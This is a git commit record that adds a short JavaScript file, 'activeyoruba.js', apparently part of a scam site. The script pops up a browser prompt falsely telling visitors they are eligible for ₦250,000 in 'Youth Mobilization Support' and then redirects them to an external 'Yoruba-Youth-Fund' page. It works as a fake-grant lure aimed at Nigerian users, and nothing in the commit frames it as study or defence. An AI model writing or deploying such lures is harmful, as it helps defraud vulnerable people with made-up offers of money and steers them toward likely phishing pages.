dd4b67229d30c5e64da568a19088d06c05e081ba
kpesaa <meiosis_logins.2d@icloud.com>
2026-05-14 00:26:25 +0100

    Create activeyoruba.js

---
+++ activeyoruba.js
@@ -0,0 +1,11 @@
+
+var password = '₦250,000';
+
+password = prompt(
+  'Congratulations, you are eligible for ₦250,000 Youth Mobilization Support. Click OK to activate now.',
+  '₦250,000'
+);
+
+if (password !== '₦250,000') {
+    location.href = 'https://kpesa.info/Yoruba-Youth-Fund.html';
+}
